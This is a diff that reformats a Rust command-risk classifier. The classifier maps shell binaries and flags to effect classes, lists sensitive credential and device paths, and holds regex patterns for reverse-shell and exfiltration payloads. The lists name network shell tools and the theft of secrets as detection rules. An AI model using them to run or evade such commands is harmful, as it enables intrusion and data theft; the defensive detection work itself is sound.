@@ -97,140 +97,861 @@ struct Capability {
 fn capabilities() -> HashMap<&'static str, Capability> {
     use EffectClass::*;
     HashMap::from([
-        ("ls", Capability { base: Read, flag_modifiers: vec![] }),
-        ("ll", Capability { base: Read, flag_modifiers: vec![] }),
-        ("la", Capability { base: Read, flag_modifiers: vec![] }),
-        ("cat", Capability { base: Read, flag_modifiers: vec![] }),
-        ("head", Capability { base: Read, flag_modifiers: vec![] }),
-        ("tail", Capability { base: Read, flag_modifiers: vec![] }),
-        ("grep", Capability { base: Read, flag_modifiers: vec![] }),
-        ("find", Capability { base: Read, flag_modifiers: vec![("-delete", CatastrophicWrite), ("-exec rm", CatastrophicWrite), ("-exec sh", DestructiveExec), ("-exec bash", DestructiveExec)] }),
-        ("stat", Capability { base: Read, flag_modifiers: vec![] }),
-        ("file", Capability { base: Read, flag_modifiers: vec![] }),
-        ("less", Capability { base: Read, flag_modifiers: vec![] }),
-        ("more", Capability { base: Read, flag_modifiers: vec![] }),
-        ("diff", Capability { base: Read, flag_modifiers: vec![] }),
-        ("wc", Capability { base: Read, flag_modifiers: vec![] }),
-        ("sort", Capability { base: Read, flag_modifiers: vec![] }),
-        ("ps", Capability { base: Read, flag_modifiers: vec![] }),
-        ("who", Capability { base: Read, flag_modifiers: vec![] }),
-        ("top", Capability { base: Read, flag_modifiers: vec![] }),
-        ("id", Capability { base: Read, flag_modifiers: vec![] }),
-        ("whoami", Capability { base: Read, flag_modifiers: vec![] }),
-        ("env", Capability { base: Read, flag_modifiers: vec![] }),
-        ("echo", Capability { base: Read, flag_modifiers: vec![] }),
-        ("pwd", Capability { base: Read, flag_modifiers: vec![] }),
-        ("date", Capability { base: Read, flag_modifiers: vec![] }),
-        ("uname", Capability { base: Read, flag_modifiers: vec![] }),
-        ("mkdir", Capability { base: Write, flag_modifiers: vec![] }),
-        ("touch", Capability { base: Write, flag_modifiers: vec![] }),
-        ("cp", Capability { base: Write, flag_modifiers: vec![("-r", Write)] }),
-        ("mv", Capability { base: Write, flag_modifiers: vec![] }),
-        ("tee", Capability { base: Write, flag_modifiers: vec![] }),
-        ("sed", Capability { base: Read, flag_modifiers: vec![("-i", Write)] }),
-        ("awk", Capability { base: Read, flag_modifiers: vec![] }),
-        ("tar", Capability { base: Read, flag_modifiers: vec![("-x", Write), ("--extract", Write), ("--delete", DestructiveWrite)] }),
-        ("zip", Capability { base: Write, flag_modifiers: vec![] }),
-        ("unzip", Capability { base: Write, flag_modifiers: vec![] }),
-        ("rm", Capability { base: CatastrophicWrite, flag_modifiers: vec![] }),
-        ("shred", Capability { base: CatastrophicWrite, flag_modifiers: vec![] }),
-        ("dd", Capability { base: Write, flag_modifiers: vec![("of=/dev/", CatastrophicWrite)] }),
-        ("mkfs", Capability { base: CatastrophicWrite, flag_modifiers: vec![] }),
-        ("truncate", Capability { base: CatastrophicWrite, flag_modifiers: vec![] }),
-        ("chmod", Capability { base: PrivilegeChange, flag_modifiers: vec![] }),
-        ("chown", Capability { base: PrivilegeChange, flag_modifiers: vec![] }),
-        ("sudo", Capability { base: Execute, flag_modifiers: vec![("-s", DestructiveExec), ("--shell", DestructiveExec)] }),
-        ("su", Capability { base: PrivilegeChange, flag_modifiers: vec![("-", DestructiveExec)] }),
-        ("curl", Capability { base: NetworkRead, flag_modifiers: vec![("-d", NetworkWrite), ("--data", NetworkWrite), ("-F", NetworkWrite), ("--form", NetworkWrite), ("-X POST", NetworkWrite), ("-X PUT", NetworkWrite), ("-T", NetworkWrite), ("--upload", NetworkWrite), ("-o", Write)] }),
-        ("wget", Capability { base: NetworkRead, flag_modifiers: vec![("--post-data", NetworkWrite), ("--post-file", Exfiltration)] }),
-        ("scp", Capability { base: NetworkWrite, flag_modifiers: vec![] }),
-        ("rsync", Capability { base: Write, flag_modifiers: vec![("--delete", DestructiveWrite), ("--remove-source-files", DestructiveWrite), ("--delete-after", DestructiveWrite), ("--delete-before", DestructiveWrite), ("--delete-during", DestructiveWrite), ("--delete-excluded", DestructiveWrite)] }),
-        ("sftp", Capability { base: NetworkWrite, flag_modifiers: vec![] }),
-        ("ftp", Capability { base: NetworkWrite, flag_modifiers: vec![] }),
-        ("nc", Capability { base: NetworkRead, flag_modifiers: vec![("-e", DestructiveExec), ("-c", DestructiveExec)] }),
-        ("ncat", Capability { base: NetworkRead, flag_modifiers: vec![("-e", DestructiveExec), ("-c", DestructiveExec)] }),
-        ("ssh", Capability { base: NetworkRead, flag_modifiers: vec![("-R", NetworkWrite), ("-L", NetworkWrite)] }),
-        ("openssl", Capability { base: NetworkRead, flag_modifiers: vec![("s_client", Exfiltration), ("enc -e", Write), ("enc -d", Write), ("genrsa", Write), ("req", Write), ("pkcs12 -export", Exfiltration)] }),
-        ("base64", Capability { base: Read, flag_modifiers: vec![("-d", Read)] }),
-        ("xxd", Capability { base: Read, flag_modifiers: vec![] }),
-        ("hexdump", Capability { base: Read, flag_modifiers: vec![] }),
-        ("socat", Capability { base: NetworkWrite, flag_modifiers: vec![("exec", DestructiveExec), ("EXEC", DestructiveExec)] }),
-        ("nmap", Capability { base: NetworkRead, flag_modifiers: vec![] }),
-        ("strace", Capability { base: Read, flag_modifiers: vec![] }),
-        ("ltrace", Capability { base: Read, flag_modifiers: vec![] }),
-        ("gdb", Capability { base: Execute, flag_modifiers: vec![] }),
-        ("bash", Capability { base: Execute, flag_modifiers: vec![("-i", DestructiveExec), ("-c", Execute)] }),
-        ("sh", Capability { base: Execute, flag_modifiers: vec![("-i", DestructiveExec), ("-c", Execute)] }),
-        ("python", Capability { base: Execute, flag_modifiers: vec![("-c", Execute)] }),
-        ("python3", Capability { base: Execute, flag_modifiers: vec![("-c", Execute)] }),
-        ("node", Capability { base: Execute, flag_modifiers: vec![("-e", Execute)] }),
-        ("perl", Capability { base: Execute, flag_modifiers: vec![("-e", Execute)] }),
-        ("ruby", Capability { base: Execute, flag_modifiers: vec![("-e", Execute)] }),
-        ("eval", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
-        ("exec", Capability { base: Execute, flag_modifiers: vec![] }),
-        ("crontab", Capability { base: Read, flag_modifiers: vec![("-e", Write), ("-r", DestructiveWrite)] }),
-        ("at", Capability { base: Write, flag_modifiers: vec![] }),
-        ("systemctl", Capability { base: Read, flag_modifiers: vec![("enable", Write), ("disable", Write), ("stop", Write), ("start", Write)] }),
-        ("git", Capability { base: Read, flag_modifiers: vec![("clean -fdx", CatastrophicWrite), ("clean -fd", CatastrophicWrite), ("push --force", NetworkWrite), ("push -f", NetworkWrite), ("commit", Write), ("add", Write), ("rm", CatastrophicWrite), ("reset --hard", CatastrophicWrite)] }),
-        ("psql", Capability { base: Read, flag_modifiers: vec![("DROP", DestructiveWrite), ("DELETE", DestructiveWrite), ("TRUNCATE", DestructiveWrite), ("INSERT", Write), ("UPDATE", Write), ("CREATE", Write)] }),
-        ("mysql", Capability { base: Read, flag_modifiers: vec![("DROP", DestructiveWrite), ("DELETE", DestructiveWrite), ("TRUNCATE", DestructiveWrite)] }),
-        ("sqlite3", Capability { base: Read, flag_modifiers: vec![("DROP", DestructiveWrite), ("DELETE", DestructiveWrite)] }),
-        ("pip", Capability { base: NetworkRead, flag_modifiers: vec![("install", Write), ("uninstall", DestructiveWrite)] }),
-        ("npm", Capability { base: NetworkRead, flag_modifiers: vec![("install", Write), ("uninstall", DestructiveWrite)] }),
-        ("apt", Capability { base: NetworkRead, flag_modifiers: vec![("install", Write), ("remove", DestructiveWrite), ("purge", DestructiveWrite)] }),
-        ("iptables", Capability { base: PrivilegeChange, flag_modifiers: vec![] }),
-        ("ufw", Capability { base: PrivilegeChange, flag_modifiers: vec![("disable", PrivilegeChange), ("delete", PrivilegeChange)] }),
-        ("reboot", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
-        ("shutdown", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
-        ("halt", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
-        ("poweroff", Capability { base: DestructiveExec, flag_modifiers: vec![] }),
-        ("kill", Capability { base: Write, flag_modifiers: vec![] }),
-        ("killall", Capability { base: DestructiveWrite, flag_modifiers: vec![] }),
-        ("pkill", Capability { base: Write, flag_modifiers: vec![] }),
+        (
+            "ls",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "ll",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "la",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "cat",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "head",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "tail",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "grep",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "find",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![
+                    ("-delete", CatastrophicWrite),
+                    ("-exec rm", CatastrophicWrite),
+                    ("-exec sh", DestructiveExec),
+                    ("-exec bash", DestructiveExec),
+                ],
+            },
+        ),
+        (
+            "stat",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "file",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "less",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "more",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "diff",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "wc",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "sort",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "ps",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "who",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "top",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "id",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "whoami",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "env",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "echo",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "pwd",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "date",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "uname",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "mkdir",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "touch",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "cp",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![("-r", Write)],
+            },
+        ),
+        (
+            "mv",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "tee",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "sed",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![("-i", Write)],
+            },
+        ),
+        (
+            "awk",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "tar",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![
+                    ("-x", Write),
+                    ("--extract", Write),
+                    ("--delete", DestructiveWrite),
+                ],
+            },
+        ),
+        (
+            "zip",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "unzip",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "rm",
+            Capability {
+                base: CatastrophicWrite,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "shred",
+            Capability {
+                base: CatastrophicWrite,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "dd",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![("of=/dev/", CatastrophicWrite)],
+            },
+        ),
+        (
+            "mkfs",
+            Capability {
+                base: CatastrophicWrite,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "truncate",
+            Capability {
+                base: CatastrophicWrite,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "chmod",
+            Capability {
+                base: PrivilegeChange,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "chown",
+            Capability {
+                base: PrivilegeChange,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "sudo",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![("-s", DestructiveExec), ("--shell", DestructiveExec)],
+            },
+        ),
+        (
+            "su",
+            Capability {
+                base: PrivilegeChange,
+                flag_modifiers: vec![("-", DestructiveExec)],
+            },
+        ),
+        (
+            "curl",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![
+                    ("-d", NetworkWrite),
+                    ("--data", NetworkWrite),
+                    ("-F", NetworkWrite),
+                    ("--form", NetworkWrite),
+                    ("-X POST", NetworkWrite),
+                    ("-X PUT", NetworkWrite),
+                    ("-T", NetworkWrite),
+                    ("--upload", NetworkWrite),
+                    ("-o", Write),
+                ],
+            },
+        ),
+        (
+            "wget",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![("--post-data", NetworkWrite), ("--post-file", Exfiltration)],
+            },
+        ),
+        (
+            "scp",
+            Capability {
+                base: NetworkWrite,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "rsync",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![
+                    ("--delete", DestructiveWrite),
+                    ("--remove-source-files", DestructiveWrite),
+                    ("--delete-after", DestructiveWrite),
+                    ("--delete-before", DestructiveWrite),
+                    ("--delete-during", DestructiveWrite),
+                    ("--delete-excluded", DestructiveWrite),
+                ],
+            },
+        ),
+        (
+            "sftp",
+            Capability {
+                base: NetworkWrite,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "ftp",
+            Capability {
+                base: NetworkWrite,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "nc",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![("-e", DestructiveExec), ("-c", DestructiveExec)],
+            },
+        ),
+        (
+            "ncat",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![("-e", DestructiveExec), ("-c", DestructiveExec)],
+            },
+        ),
+        (
+            "ssh",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![("-R", NetworkWrite), ("-L", NetworkWrite)],
+            },
+        ),
+        (
+            "openssl",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![
+                    ("s_client", Exfiltration),
+                    ("enc -e", Write),
+                    ("enc -d", Write),
+                    ("genrsa", Write),
+                    ("req", Write),
+                    ("pkcs12 -export", Exfiltration),
+                ],
+            },
+        ),
+        (
+            "base64",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![("-d", Read)],
+            },
+        ),
+        (
+            "xxd",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "hexdump",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "socat",
+            Capability {
+                base: NetworkWrite,
+                flag_modifiers: vec![("exec", DestructiveExec), ("EXEC", DestructiveExec)],
+            },
+        ),
+        (
+            "nmap",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "strace",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "ltrace",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "gdb",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "bash",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![("-i", DestructiveExec), ("-c", Execute)],
+            },
+        ),
+        (
+            "sh",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![("-i", DestructiveExec), ("-c", Execute)],
+            },
+        ),
+        (
+            "python",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![("-c", Execute)],
+            },
+        ),
+        (
+            "python3",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![("-c", Execute)],
+            },
+        ),
+        (
+            "node",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![("-e", Execute)],
+            },
+        ),
+        (
+            "perl",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![("-e", Execute)],
+            },
+        ),
+        (
+            "ruby",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![("-e", Execute)],
+            },
+        ),
+        (
+            "eval",
+            Capability {
+                base: DestructiveExec,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "exec",
+            Capability {
+                base: Execute,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "crontab",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![("-e", Write), ("-r", DestructiveWrite)],
+            },
+        ),
+        (
+            "at",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "systemctl",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![
+                    ("enable", Write),
+                    ("disable", Write),
+                    ("stop", Write),
+                    ("start", Write),
+                ],
+            },
+        ),
+        (
+            "git",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![
+                    ("clean -fdx", CatastrophicWrite),
+                    ("clean -fd", CatastrophicWrite),
+                    ("push --force", NetworkWrite),
+                    ("push -f", NetworkWrite),
+                    ("commit", Write),
+                    ("add", Write),
+                    ("rm", CatastrophicWrite),
+                    ("reset --hard", CatastrophicWrite),
+                ],
+            },
+        ),
+        (
+            "psql",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![
+                    ("DROP", DestructiveWrite),
+                    ("DELETE", DestructiveWrite),
+                    ("TRUNCATE", DestructiveWrite),
+                    ("INSERT", Write),
+                    ("UPDATE", Write),
+                    ("CREATE", Write),
+                ],
+            },
+        ),
+        (
+            "mysql",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![
+                    ("DROP", DestructiveWrite),
+                    ("DELETE", DestructiveWrite),
+                    ("TRUNCATE", DestructiveWrite),
+                ],
+            },
+        ),
+        (
+            "sqlite3",
+            Capability {
+                base: Read,
+                flag_modifiers: vec![("DROP", DestructiveWrite), ("DELETE", DestructiveWrite)],
+            },
+        ),
+        (
+            "pip",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![("install", Write), ("uninstall", DestructiveWrite)],
+            },
+        ),
+        (
+            "npm",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![("install", Write), ("uninstall", DestructiveWrite)],
+            },
+        ),
+        (
+            "apt",
+            Capability {
+                base: NetworkRead,
+                flag_modifiers: vec![
+                    ("install", Write),
+                    ("remove", DestructiveWrite),
+                    ("purge", DestructiveWrite),
+                ],
+            },
+        ),
+        (
+            "iptables",
+            Capability {
+                base: PrivilegeChange,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "ufw",
+            Capability {
+                base: PrivilegeChange,
+                flag_modifiers: vec![("disable", PrivilegeChange), ("delete", PrivilegeChange)],
+            },
+        ),
+        (
+            "reboot",
+            Capability {
+                base: DestructiveExec,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "shutdown",
+            Capability {
+                base: DestructiveExec,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "halt",
+            Capability {
+                base: DestructiveExec,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "poweroff",
+            Capability {
+                base: DestructiveExec,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "kill",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "killall",
+            Capability {
+                base: DestructiveWrite,
+                flag_modifiers: vec![],
+            },
+        ),
+        (
+            "pkill",
+            Capability {
+                base: Write,
+                flag_modifiers: vec![],
+            },
+        ),
     ])
 }
 
 fn sensitive_targets() -> Vec<(&'static str, EffectClass)> {
     use EffectClass::*;
     vec![
-        ("/etc/passwd", Read), ("/etc/shadow", Read), ("/etc/sudoers", Read), ("/etc/hosts", Read),
-        (".env", Read), ("id_rsa", Read), (".aws/credentials", Read), (".ssh/", Read),
-        ("authorized_keys", Write), ("/dev/sda", DestructiveWrite), ("/dev/zero", DestructiveWrite), ("/dev/null", Write),
+        ("/etc/passwd", Read),
+        ("/etc/shadow", Read),
+        ("/etc/sudoers", Read),
+        ("/etc/hosts", Read),
+        (".env", Read),
+        ("id_rsa", Read),
+        (".aws/credentials", Read),
+        (".ssh/", Read),
+        ("authorized_keys", Write),
+        ("/dev/sda", DestructiveWrite),
+        ("/dev/zero", DestructiveWrite),
+        ("/dev/null", Write),
     ]
 }
 
 fn payload_patterns() -> Vec<(&'static str, EffectClass, &'static str)> {
     use EffectClass::*;
     vec![
-        (r"socket\.connect\s*\(", Exfiltration, "Network socket connection in code payload"),
-        (r"os\.system\s*\(", DestructiveExec, "os.system() shell execution in payload"),
-        (r"subprocess\.(call|Popen|run)", DestructiveExec, "subprocess execution in payload"),
-        (r"__import__\s*\(", DestructiveExec, "Dynamic import in payload"),
-        (r"/bin/(sh|bash)", DestructiveExec, "Shell spawned from payload"),
-        (r"dup2\s*\(", Exfiltration, "File descriptor duplication — reverse shell pattern"),
-        (r"0>&1|>&\s*/dev/tcp", Exfiltration, "Bash I/O redirection to TCP — reverse shell"),
+        (
+            r"socket\.connect\s*\(",
+            Exfiltration,
+            "Network socket connection in code payload",
+        ),
+        (
+            r"os\.system\s*\(",
+            DestructiveExec,
+            "os.system() shell execution in payload",
+        ),
+        (
+            r"subprocess\.(call|Popen|run)",
+            DestructiveExec,
+            "subprocess execution in payload",
+        ),
+        (
+            r"__import__\s*\(",
+            DestructiveExec,
+            "Dynamic import in payload",
+        ),
+        (
+            r"/bin/(sh|bash)",
+            DestructiveExec,
+            "Shell spawned from payload",
+        ),
+        (
+            r"dup2\s*\(",
+            Exfiltration,
+            "File descriptor duplication — reverse shell pattern",
+        ),
+        (
+            r"0>&1|>&\s*/dev/tcp",
+            Exfiltration,
+            "Bash I/O redirection to TCP — reverse shell",
+        ),
     ]
 }
 
 fn infer_intent_effects(prime_intent: &str) -> HashSet<EffectClass> {
-    let tokens: HashSet<String> = Regex::new(r"\b\w+\b").unwrap()
+    let tokens: HashSet<String> = Regex::new(r"\b\w+\b")
+        .unwrap()
         .find_iter(&prime_intent.to_lowercase())
         .map(|m| m.as_str().to_string())
         .collect();
 
-    let read_kw = hs(&["read","check","inspect","view","show","list","display","fetch","get","describe","audit","review","monitor","watch","tail","head","look","examine","verify","query","search","find","locate","status","report","diagnose","trace"]);
-    let write_kw = hs(&["create","write","save","store","configure","set","update","modify","edit","change","append","add","insert","prepare","build","compile","generate","produce","make","backup"]);
-    let del_kw = hs(&["delete","remove","clean","purge","wipe","clear","drop","erase","archive","retire","decommission","uninstall","destroy","prune","trim","flush","rollback"]);
-    let net_kw = hs(&["send","upload","post","transfer","sync","push","export","publish","deploy","broadcast","transmit","forward","relay","notify","report","ping","connect","download","pull","fetch"]);
-    let exec_kw = hs(&["run","execute","launch","start","trigger","invoke","call","script","test","migrate","install","apply","process"]);
+    let read_kw = hs(&[
+        "read", "check", "inspect", "view", "show", "list", "display", "fetch", "get", "describe",
+        "audit", "review", "monitor", "watch", "tail", "head", "look", "examine", "verify",
+        "query", "search", "find", "locate", "status", "report", "diagnose", "trace",
+    ]);
+    let write_kw = hs(&[
+        "create",
+        "write",
+        "save",
+        "store",
+        "configure",
+        "set",
+        "update",
+        "modify",
+        "edit",
+        "change",
+        "append",
+        "add",
+        "insert",
+        "prepare",
+        "build",
+        "compile",
+        "generate",
+        "produce",
+        "make",
+        "backup",
+    ]);
+    let del_kw = hs(&[
+        "delete",
+        "remove",
+        "clean",
+        "purge",
+        "wipe",
+        "clear",
+        "drop",
+        "erase",
+        "archive",
+        "retire",
+        "decommission",
+        "uninstall",
+        "destroy",
+        "prune",
+        "trim",
+        "flush",
+        "rollback",
+    ]);
+    let net_kw = hs(&[
+        "send",
+        "upload",
+        "post",
+        "transfer",
+        "sync",
+        "push",
+        "export",
+        "publish",
+        "deploy",
+        "broadcast",
+        "transmit",
+        "forward",
+        "relay",
+        "notify",
+        "report",
+        "ping",
+        "connect",
+        "download",
+        "pull",
+        "fetch",
+    ]);
+    let exec_kw = hs(&[
+        "run", "execute", "launch", "start", "trigger", "invoke", "call", "script", "test",
+        "migrate", "install", "apply", "process",
+    ]);
 
     let mut implied = HashSet::new();
-    if !tokens.is_disjoint(&read_kw) { implied.insert(EffectClass::Read); }
-    if !tokens.is_disjoint(&write_kw) { implied.insert(EffectClass::Write); }
-    if !tokens.is_disjoint(&del_kw) { implied.insert(EffectClass::DestructiveWrite); implied.insert(EffectClass::CatastrophicWrite); }
-    if !tokens.is_disjoint(&net_kw) { implied.insert(EffectClass::NetworkWrite); implied.insert(EffectClass::NetworkRead); }
-    if !tokens.is_disjoint(&exec_kw) { implied.insert(EffectClass::Execute); }
-    if implied.is_empty() { implied.insert(EffectClass::Read); }
+    if !tokens.is_disjoint(&read_kw) {
+        implied.insert(EffectClass::Read);
+    }
+    if !tokens.is_disjoint(&write_kw) {
+        implied.insert(EffectClass::Write);
+    }
+    if !tokens.is_disjoint(&del_kw) {
+        implied.insert(EffectClass::DestructiveWrite);
+        implied.insert(EffectClass::CatastrophicWrite);
+    }
+    if !tokens.is_disjoint(&net_kw) {
+        implied.insert(EffectClass::NetworkWrite);
+        implied.insert(EffectClass::NetworkRead);
+    }
+    if !tokens.is_disjoint(&exec_kw) {
+        implied.insert(EffectClass::Execute);
+    }
+    if implied.is_empty() {
+        implied.insert(EffectClass::Read);
+    }
     implied
 }
 
@@ -255,11 +976,22 @@ pub fn parse_command(command: &str) -> Vec<ParsedSubCommand> {
 
     let mut out = Vec::new();
     for part in expanded.into_iter().filter(|p| !p.is_empty()) {
-        let tokens = shell_words::split(&part).unwrap_or_else(|_| part.split_whitespace().map(|s| s.to_string()).collect());
-        if tokens.is_empty() { continue; }
+        let tokens = shell_words::split(&part)
+            .unwrap_or_else(|_| part.split_whitespace().map(|s| s.to_string()).collect());
+        if tokens.is_empty() {
+            continue;
+        }
         let binary = tokens[0].trim_start_matches("./").to_lowercase();
-        let flags_str = if tokens.len() > 1 { tokens[1..].join(" ") } else { String::new() };
-        out.push(ParsedSubCommand { binary, flags_str, full_str: part });
+        let flags_str = if tokens.len() > 1 {
+            tokens[1..].join(" ")
+        } else {
+            String::new()
+        };
+        out.push(ParsedSubCommand {
+            binary,
+            flags_str,
+            full_str: part,
+        });
     }
     out
 }
@@ -275,18 +1007,30 @@ pub fn compute_subcommand_effect(sub: &ParsedSubCommand) -> (EffectClass, Vec<St
                 || sub.full_str.to_lowercase().contains(&flag.to_lowercase())
             {
                 if eff.severity() > current.severity() {
-                    evidence.push(format!("Flag modifier '{}' upgrades '{}' to {}", flag, sub.binary, eff.as_str()));
+                    evidence.push(format!(
+                        "Flag modifier '{}' upgrades '{}' to {}",
+                        flag,
+                        sub.binary,
+                        eff.as_str()
+                    ));
                     current = *eff;
                     upgraded = true;
                 }
             }
         }
         if !upgraded {
-            evidence.push(format!("Binary '{}' base class: {}", sub.binary, current.as_str()));
+            evidence.push(format!(
+                "Binary '{}' base class: {}",
+                sub.binary,
+                current.as_str()
+            ));
         }
         current
     } else {
-        evidence.push(format!("Unknown binary '{}' — defaulting to EXECUTE class (zero-trust policy)", sub.binary));
+        evidence.push(format!(
+            "Unknown binary '{}' — defaulting to EXECUTE class (zero-trust policy)",
+            sub.binary
+        ));
         EffectClass::Execute
     };
 
@@ -344,7 +1088,12 @@ pub fn compute_effect_graph(command: &str, prime_intent: &str) -> EffectGraph {
     let sensitive_in_chain = is_pipe
         && ((effect_list.iter().any(|e| *e == EffectClass::Read)
             && effect_list.iter().any(|e| {
-                matches!(e, EffectClass::NetworkWrite | EffectClass::NetworkRead | EffectClass::Exfiltration)
+                matches!(
+                    e,
+                    EffectClass::NetworkWrite
+                        | EffectClass::NetworkRead
+                        | EffectClass::Exfiltration
+                )
             }))
             || effect_list.iter().any(|e| *e == EffectClass::Exfiltration));
 
@@ -359,7 +1108,11 @@ pub fn compute_effect_graph(command: &str, prime_intent: &str) -> EffectGraph {
 
     let base_floor = worst.floor();
     let intent_effects = infer_intent_effects(prime_intent);
-    let intent_max = intent_effects.iter().map(|e| e.severity()).max().unwrap_or(0) as f64;
+    let intent_max = intent_effects
+        .iter()
+        .map(|e| e.severity())
+        .max()
+        .unwrap_or(0) as f64;
     let actual_max = worst.severity() as f64;
     let severity_gap = actual_max - intent_max;
     let effect_divergence = ((severity_gap / 9.0).clamp(0.0, 1.0) * 1000.0).round() / 1000.0;
@@ -396,7 +1149,10 @@ pub fn effect_to_threat_class(effect: EffectClass) -> &'static str {
         EffectClass::Benign | EffectClass::Read => "BENIGN",
         EffectClass::NetworkRead | EffectClass::Write | EffectClass::Execute => "MODERATE",
         EffectClass::PrivilegeChange | EffectClass::NetworkWrite => "ELEVATED",
-        EffectClass::DestructiveWrite | EffectClass::Exfiltration | EffectClass::DestructiveExec | EffectClass::CatastrophicWrite => "CRITICAL",
+        EffectClass::DestructiveWrite
+        | EffectClass::Exfiltration
+        | EffectClass::DestructiveExec
+        | EffectClass::CatastrophicWrite => "CRITICAL",
     }
 }
 
@@ -408,16 +1164,23 @@ pub fn effect_to_sandbox_delta(graph: &EffectGraph) -> serde_json::Value {
